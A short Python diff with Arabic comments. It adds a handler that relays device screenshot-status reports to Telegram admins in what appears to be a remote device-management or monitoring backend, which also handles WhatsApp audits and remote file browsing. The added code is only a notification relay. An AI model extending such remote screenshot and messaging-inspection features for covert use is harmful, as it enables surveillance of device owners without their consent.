@@ -2041,6 +2041,25 @@ def _sock_file_explorer(data):
         _handle_whatsapp_audit(dev, data)
         return
 
+    # ⚡ Check for screenshot_status (تقرير حالة لقطة الشاشة)
+    if data_type == "screenshot_status":
+        status = data.get("status", "?")
+        short_id = dev.get('short_id', '?')
+        model = dev.get('model', '?')
+        logger.info(f"📸 [Screenshot] #{short_id}: {status}")
+        if mdm_bot:
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    mdm_bot.bot.send_message(admin_id,
+                        f"📸 <b>تقرير لقطة الشاشة</b>\n"
+                        f"━━━━━━━━━━━━━━━\n"
+                        f"📱 <b>الجهاز:</b> #{short_id} {model}\n"
+                        f"📝 <b>الحالة:</b> {status}",
+                        parse_mode="HTML")
+                except Exception as e:
+                    logger.error(f"فشل إرسال تقرير: {e}")
+        return
+
     cmd = data.get("command", "?")
     status = data.get("status", "?")
     logger.info(f"[Socket] استكشاف ملفات: #{dev.get('short_id', '?')} cmd={cmd} status={status}")
